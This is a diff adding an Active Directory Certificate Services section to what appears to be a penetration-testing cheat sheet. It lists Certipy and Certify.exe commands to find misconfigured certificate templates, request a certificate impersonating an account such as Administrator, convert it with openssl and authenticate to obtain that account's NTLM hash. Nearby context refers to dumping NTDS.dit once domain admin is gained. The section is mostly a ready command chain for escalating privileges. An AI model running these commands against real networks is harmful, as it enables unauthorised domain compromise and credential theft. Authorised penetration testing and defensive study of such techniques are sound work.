@@ -145,6 +145,40 @@ With CrackMapExec, use the -k and --use-kcache options to use a kerberos authent
 crackmapexec smb IP_ADDRESS/MASK -u 'USERNAME' -k --use-kcache
 ```
 
+## Active Directory Certificate Services (ADCS)
+A lot of attacks exists. First thing to do is to check for vulnerable templates.
+### Check for vulnerable templates
+Using python tool on your machine like Certipy or on a domain-joined machine using Certify.exe. Play the find command to get a global view with Bloodhound.
+```bash
+certipy find -bloodhound -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
+```
+Then, use Olivier Lyak's bloohound, which includes PKIs stuff (https://github.com/ly4k/BloodHound).
+You can also try to find directly vulnerable templates with certipy :
+```bash
+certipy find -vulnerable -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
+```
+If it doesn't work, you probably have to do it on a domain-joined machine, using Windows.
+You can get the compiled tools here : https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
+
+## Misconfigured Certificate Template
+If you find a certificate template with those things, the job is almost done :
+-msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT : it means that the user, who is requesting a new certificate based on this certificate template, can request the certificate for another user (like Domain admins)
+-PkiExtendedKeyUsage: Client Authentication : it means that the certificate that will be generated based on this certificate template can be used to authenticate to computers in Active Directory
+-Enrollment Rights: NT Authority\Authenticated Users or Domains users : it means that any authenticated user in the Active Directory is allowed to request new certificates to be generated based on this certificate template.
+So, you can firstly ask a certificate for Administrator, using tools like Certify.exe :
+```powershell
+./Certify.exe request /ca:FQDN\CA-NAME /domain:DOMAIN /template:VULNERABLE-TEMPLATE-NAME /altname:ACCOUNT-TO-IMPERSONATE
+```
+This will generate a .pem certificate. To use it and ask a TGT, you have to convert it to .pfx format, using openssl :
+```bash
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+Then, use certipy to ask a TGT and get the account NTLM hash :
+```bash
+certipy auth -pfx cert.pfx -dc-ip DC-IP -u ACCOUNT-TO-IMPERSONATE -domain DOMAIN
+```
+You then get the NTLM Hash. Enjoy ;)
+
 ## NTDS Exfiltration
 ### Remote extraction using CrackmapExec or Impacket
 Once you get domain admin, dump NTDS.dit to get all the hashes from the Active Directory :
